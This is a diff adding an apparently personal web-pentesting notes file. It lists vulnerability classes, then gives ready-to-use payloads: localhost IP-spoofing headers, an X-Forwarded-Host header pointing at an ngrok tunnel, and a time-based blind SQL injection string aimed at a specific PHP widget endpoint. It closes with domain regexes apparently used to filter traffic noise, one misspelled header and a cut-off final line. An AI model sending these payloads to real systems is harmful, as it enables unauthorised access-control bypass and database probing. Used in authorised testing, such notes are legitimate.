@@ -1,0 +1,26 @@
+Cross-Site Scripting (XSS),
+Insecure Direct Object Reference (IDOR),
+Cross-Site Request Forgery (CSRF),
+Race Conditions,
+Information Disclosure.
+
+
+X-Forwarded-For: 127.0.0.2
+X-Originting-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.3
+X-Remote-Addr: 127.0.0.4
+X-Client-IP: 127.0.0.5
+X-Host: 127.0.0.6
+X-Forwarded-Host: http://f5392536fab4.ngrok.io
+
+
+&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
+
+:/php/widgets_handler.php?method=getResWidgetButton&res_id=51-CASE/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
+
+.*\.google\.com 
+.*\.gstatic\.com
+.*\.mozilla\.com
+.*\.googleapis\.com
+.*\.pki\.goog
+No more noise i
